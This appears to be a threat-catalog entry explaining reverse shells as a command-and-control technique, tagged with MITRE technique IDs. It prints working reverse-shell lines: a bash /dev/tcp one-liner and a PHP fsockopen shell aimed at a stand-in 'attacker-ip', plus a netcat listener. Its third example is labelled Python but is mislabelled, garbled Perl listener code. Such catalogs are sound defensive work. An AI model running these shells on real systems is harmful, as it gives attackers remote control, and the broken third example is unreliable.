# Reverse shell or remote session from compromised host

## Metadata

- **UUID**: `157710ff-962d-4fa3-a516-ac5883f2d5ef`
- **Schema**: `threat::1.0`
- **TLP**: clear

## Description
### Threat vector
A reverse shell is a technique that refers to a situation
where adversaries, who have successfully compromised a system,
establish a connection to their own system or server.
This connection allows the adversaries to gain remote access 
and control over the compromised system, enabling them to 
execute commands and perform malicious actions.  

### Command&Control phases
Below are the phases of how a reverse shell works:  

- System compromise: the adversaries must succeed in compromising
  the security of the system. This may involve exploiting vulnerabilities
  in the software, misconfiguration, tricking the user into running a 
  malicious program, or via other ways.  

- Establishing a reverse connection: Once the system has been compromised,
  the adversaries set up a reverse connection from the compromised system
  to their own. This is often done using a malicious application or script
  that runs on the compromised system and communicates with a server controlled 
  by adversaries.  

- Remote control: With the reverse connection established, adversaries can
  have full or partial access and control over the compromised system. This 
  allows them to execute commands, manipulate files, steal information, install
  additional malware, modify configurations and perform other actions according 
  to their goals.  

### Code examples of reverse shells:

#### Example 1 - Bash
      
  Start a listener on the attackers machine
  `nc -nlvp 4444`

  On the target machine, use Bash to establish a connection back to the listener
  `bash -i >& /dev/tcp/attacker-ip/4444 0>&1`

  This code assumes that the attacker has started a listener on their machine using
  the nc (netcat) utility, which is listening on a specified port (in this case, 4444). 
  The second line of code, which is executed on the target machine, uses Bash to open
  a connection back to the listener and establish a command shell. 

#### Example 2 - PHP

  The attacker establishes a command shell on a remote machine by exploiting a
  vulnerability in the target system and using PHP, a server-side scripting language,
  to execute commands on the target machine:

```
  <?php
  // Start a listener on the attacker's machine
  $sock=fsockopen("attacker-ip", 4444);
  exec("/bin/sh -i <&3 >&3 2>&3");
  ?>
```

The PHP code uses the fsockopen() function to open a connection to the listener and
the exec() function to execute the /bin/sh shell and redirect its input, output, and
error streams to the connection with the listener.

#### Example 3 - Python

This code example can be used to establish a command shell on a remote machine.

Start a listener on the attackers machine
```
  use IO::Socket;
  $|=1;
  $socket = new IO::Socket::INET (
      LocalHost => '0.0.0.0',
      LocalPort => '4444',
      Proto => 'tcp',
      Listen => 1,
      Reuse => 1
  );

  Wait for a connection from the target machine
  $new_socket = $socket->accept();

  Open a command shell on the target machine
  system("/bin/sh -i <&3 >&3 2>&3");

  Close the connection
  $new_socket->close();
```

## Techniques
- T1071.001
- T1571
- T1572
- T1059
